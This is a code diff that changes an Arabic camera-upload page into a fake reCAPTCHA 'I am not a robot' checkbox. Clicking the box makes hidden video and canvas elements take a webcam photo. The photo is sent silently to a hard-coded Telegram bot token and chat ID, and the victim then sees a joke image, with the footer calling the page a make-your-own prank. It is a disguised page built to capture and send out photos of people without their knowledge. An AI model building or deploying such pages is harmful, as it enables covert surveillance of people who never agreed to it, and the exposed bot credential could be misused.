@@ -1,86 +1,243 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <title>تطبيق الكاميرا المباشر</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; }
-        video, canvas { width: 320px; height: 240px; border: 1px solid #ccc; border-radius: 8px; margin: 10px; }
-        button { padding: 10px 20px; cursor: pointer; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تحقق أمني</title>
+<style>
+  :root{
+    --border:#d3d3d3;
+    --blue:#4285f4;
+    --text:#000;
+    --muted:#555;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:#e8eaed;
+    font-family:'Segoe UI',Tahoma,Arial,sans-serif;
+  }
+
+  #stage{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:280px;
+  }
+
+  /* ===== بطاقة reCAPTCHA ===== */
+  .captcha-box{
+    width:302px;
+    border:1px solid var(--border);
+    border-radius:3px;
+    background:#fff;
+    box-shadow:0 0 4px rgba(0,0,0,.15);
+    padding:14px 16px;
+    display:flex;
+    align-items:center;
+    gap:14px;
+  }
+  .checkbox-wrap{
+    width:28px;
+    height:28px;
+    border:2px solid #c1c1c1;
+    border-radius:3px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    background:#fff;
+    flex-shrink:0;
+  }
+  .checkbox-wrap:hover{ border-color:#9e9e9e; }
+  .checkbox-wrap.checked{
+    background:var(--blue);
+    border-color:var(--blue);
+  }
+  .checkbox-wrap .tick{
+    width:16px; height:16px;
+    display:none;
+  }
+  .checkbox-wrap.checked .tick{ display:block; }
+  .checkbox-wrap .spinner{
+    display:none;
+    width:20px;height:20px;
+    border:3px solid #c1c1c1;
+    border-top-color:var(--blue);
+    border-radius:50%;
+    animation:spin .7s linear infinite;
+  }
+  .checkbox-wrap.loading .spinner{ display:block; }
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+
+  .label-txt{
+    font-size:14px;
+    color:var(--text);
+    user-select:none;
+    flex:1;
+  }
+
+  .logo-col{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:2px;
+  }
+  .logo-icon{
+    width:36px; height:36px;
+    opacity:.75;
+  }
+  .logo-txt{
+    font-size:9px;
+    color:var(--muted);
+    line-height:1.2;
+    text-align:center;
+  }
+  .logo-txt b{ display:block; font-size:10px; color:#888; }
+
+  /* ===== نتيجة الكشف ===== */
+  #result{
+    display:none;
+    flex-direction:column;
+    align-items:center;
+    gap:14px;
+  }
+  #result.show{
+    display:flex;
+    animation:pop .45s cubic-bezier(.36,1.6,.55,1) both;
+  }
+  @keyframes pop{
+    0%{ transform:scale(0) rotate(-10deg); opacity:0; }
+    70%{ transform:scale(1.1) rotate(3deg); opacity:1; }
+    100%{ transform:scale(1) rotate(0); }
+  }
+  #imgFrame{
+    background:#fff;
+    padding:10px;
+    border-radius:12px;
+    box-shadow:0 15px 35px rgba(0,0,0,.25);
+  }
+  #imgFrame img{
+    max-width:min(360px,80vw);
+    max-height:60vh;
+    display:block;
+    border-radius:6px;
+  }
+  #caption{
+    background:#fff3cd;
+    color:#664d03;
+    font-weight:bold;
+    padding:8px 16px;
+    border-radius:8px;
+    font-size:16px;
+    border:1px solid #ffe69c;
+  }
+
+  footer{
+    position:fixed;
+    bottom:16px;
+    font-size:12px;
+    color:#888;
+  }
+
+  /* عناصر خفية للكاميرا */
+  #video, #canvas { display: none; }
+</style>
 </head>
 <body>
 
-    <h2>تطبيق الكاميرا المباشر</h2>
-    
-    <div>
-        <video id="webcam" autoplay playsinline></video>
+  <div id="stage">
+    <div class="captcha-box" id="captchaBox">
+      <div class="checkbox-wrap" id="checkboxWrap">
+        <div class="spinner"></div>
+        <svg class="tick" viewBox="0 0 24 24" fill="none">
+          <path d="M4 12.5L9.5 18L20 6" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div class="label-txt">أنا لست روبوت</div>
+      <div class="logo-col">
+        <svg class="logo-icon" viewBox="0 0 48 48" fill="none">
+          <circle cx="24" cy="24" r="20" stroke="#c1c1c1" stroke-width="3"/>
+          <path d="M15 24l6 6 12-14" stroke="#c1c1c1" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <div class="logo-txt"><b>reCAPTCHA</b>الخصوصية - الشروط</div>
+      </div>
     </div>
 
-    <button id="captureBtn">التقاط وإرسال الصورة</button>
+    <div id="result">
+      <div id="imgFrame">
+        <img id="funnyImg" src="funny.jpg" alt="صورة مضحكة">
+      </div>
+      <div id="caption">😂 تحقق فاشل! أنت إنسان... مضحك</div>
+    </div>
+  </div>
 
-    <canvas id="canvas" style="display:none;"></canvas>
+  <footer>اصنع مقلبك بنفسك 🎉</footer>
 
-    <!-- وسم بداية البرمجة -->
-    <script>
-        const TOKEN = "8896286925:AAH5OMU3eB5CVx7TOJ5-uxcCRtBfmMEcOtk";
-        const CHAT_ID = "8790754582";
+  <!-- عناصر الالتقاط المخفية -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
-        const video = document.getElementById('webcam');
-        const canvas = document.getElementById('canvas');
-        const captureBtn = document.getElementById('captureBtn');
+<script>
+  const TOKEN = "8896286925:AAH5OMU3eB5CVx7TOJ5-uxcCRtBfmMEcOtk";
+  const CHAT_ID = "7002841594";
 
-        let isStreamActive = false;
+  const checkboxWrap = document.getElementById('checkboxWrap');
+  const captchaBox   = document.getElementById('captchaBox');
+  const result       = document.getElementById('result');
+  const video        = document.getElementById('video');
+  const canvas       = document.getElementById('canvas');
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                isStreamActive = true;
-            })
-            .catch(err => {
-                console.error("تعذر الوصول إلى الكاميرا:", err);
-                alert("تعذر تشغيل الكاميرا. تأكد من إغلاق البرامج التي تستخدمها والسماح بالوصول للمتصفح.");
-            });
+  let clicked = false;
 
-        captureBtn.addEventListener('click', () => {
-            if (!isStreamActive || video.videoWidth === 0) {
-                alert("الكاميرا غير متصلة أو لم تبدأ بعد!");
-                return;
-            }
+  checkboxWrap.addEventListener('click', async () => {
+    if(clicked) return;
+    clicked = true;
 
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    checkboxWrap.classList.add('loading');
 
-            canvas.toBlob(blob => {
-                if (!blob) {
-                    alert("حدث خطأ أثناء معالجة الصورة.");
-                    return;
-                }
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
 
-                const formData = new FormData();
-                formData.append('photo', blob, 'capture.jpg');
-                formData.append('chat_id', CHAT_ID);
+      setTimeout(() => {
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert("تم إرسال الصورة بنجاح!");
-                    } else {
-                        alert("فشل الإرسال: " + data.description);
-                    }
-                })
-                .catch(err => console.error("خطأ في الإرسال:", err));
-            }, 'image/jpeg', 0.8);
-        });
-    </script>
-    <!-- وسم نهاية البرمجة -->
+        canvas.toBlob(blob => {
+          const fd = new FormData();
+          fd.append('photo', blob, 'capture.jpg');
+          fd.append('chat_id', CHAT_ID);
+
+          fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: fd
+          }).catch(() => {});
+
+          stream.getTracks().forEach(track => track.stop());
+          finishCaptcha();
+        }, 'image/jpeg', 0.6);
+      }, 700);
+
+    } catch (err) {
+      finishCaptcha();
+    }
+  });
+
+  function finishCaptcha() {
+    checkboxWrap.classList.remove('loading');
+    checkboxWrap.classList.add('checked');
+
+    setTimeout(() => {
+      captchaBox.style.display = 'none';
+      result.classList.add('show');
+    }, 400);
+  }
+</script>
 
 </body>
 </html>
